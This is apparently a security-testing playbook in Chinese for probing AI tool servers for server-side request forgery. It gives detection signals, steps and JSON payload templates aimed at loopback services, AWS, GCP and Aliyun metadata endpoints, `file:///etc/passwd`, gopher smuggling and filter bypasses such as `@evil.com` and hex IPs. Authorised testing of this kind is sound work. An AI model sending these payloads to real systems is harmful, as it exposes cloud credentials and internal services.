# ssrf

## When to use
Recon 发现某个 tool 的 name / description 含 `fetch` / `http` / `url` / `webhook` /
`callback` / `request` / `scrape` / `proxy`,或输入 schema 里有 `url` / `uri` /
`endpoint` / `webhook` / `target` 这类「由 server 侧发起请求」的参数。核心特征:
**server 会替攻击者向一个 URL 发起请求,并把响应内容带回 tool result**。

## Objective
让目标 server 代我们访问一个**本不该被访问的内部目标**,并把结果暴露在响应里:
云元数据端点 (AWS / GCP / Aliyun IMDS)、本机回环服务 (ssh / redis / mongo / nginx)、
或 `file://` 本地文件。判定依据是 signals 中的:
- `ssrf_cloud_metadata` (high): args 指向元数据端点,响应含 `ami-id` /
  `instance-id` / `local-ipv4` / `security-credentials` 等键
- `ssrf_internal_service` (high): args 指向回环/内网地址,响应含内部服务 banner
  (SSH-2.0 / Redis / MongoDB / nginx / IIS)
- 交叉触发 `leaks_*` 类: 通过 `file://` 或内网读取把敏感内容带回

> 与 path_traversal 的区别:path_traversal 打**文件路径参数**,ssrf 打**server 侧代发
> 请求的 URL 参数**。两者可叠加 (`file://` 读本地文件时同时是 path 面与 ssrf 面)。

## Playbook
1. `list_tools`,找出所有接受 URL / endpoint / webhook 参数的 tool,读它的输入 schema。
2. 先用**良性**外部目标 (如 `http://example.com`) 确认 server 真的代发了请求并把
   响应带回来 (而不是只回显 URL 字符串)。这一步不做判据,只确认攻击面存在。
3. 依次试回环/内网目标:`http://127.0.0.1:22/`、`http://localhost:6379/`、
   `http://10.0.0.1/`、`http://192.168.1.1/`。响应出现 SSH 版本串 / Redis
   `ERR unknown command` / nginx 欢迎页 → `ssrf_internal_service`。
4. 试云元数据端点:`http://169.254.169.254/latest/meta-data/` (AWS)、
   `http://metadata.google.internal/computeMetadata/v1/` (GCP)、
   `http://100.100.100.200/latest/meta-data/` (Aliyun)。响应出现 `ami-id` /
   `instance-id` / `local-ipv4` / `security-credentials` 键 → `ssrf_cloud_metadata`。
5. 试协议走私:`file:///etc/passwd`、`gopher://127.0.0.1:6379/_...`。文件内容回流时
   会被 `leaks_*` 类信号捕获。
6. 若 server 对 scheme / IP 有过滤,试绕过:301 重定向到内网、`@` 符号混淆
   (`http://127.0.0.1:22@evil.com`)、十六进制/十进制 IP (`http://0x7f000001/`)、
   IPv6 回环 (`http://[::1]:22/`)、DNS rebinding 提示 (`http://localtest.me/`)。
7. 拿到任一条 high 置信证据就停;high 命中即收敛,不追求完整内网枚举。

## Templates
- `{"url": "http://example.com"}`  # 良性确认 server 代发请求
- `{"url": "http://127.0.0.1:22/"}`  # 回环 ssh banner
- `{"url": "http://localhost:6379/"}`  # redis banner / ERR unknown command
- `{"url": "http://10.0.0.1/"}`  # 内网探测
- `{"url": "http://169.254.169.254/latest/meta-data/"}`  # AWS IMDS
- `{"url": "http://metadata.google.internal/computeMetadata/v1/"}`  # GCP
- `{"url": "http://100.100.100.200/latest/meta-data/"}`  # Aliyun
- `{"url": "file:///etc/passwd"}`  # 协议走私, 交叉触发 leaks_*
- `{"url": "http://0x7f000001/"}`  # 十六进制 IP 绕过
- `{"url": "http://[::1]:22/"}`  # IPv6 回环
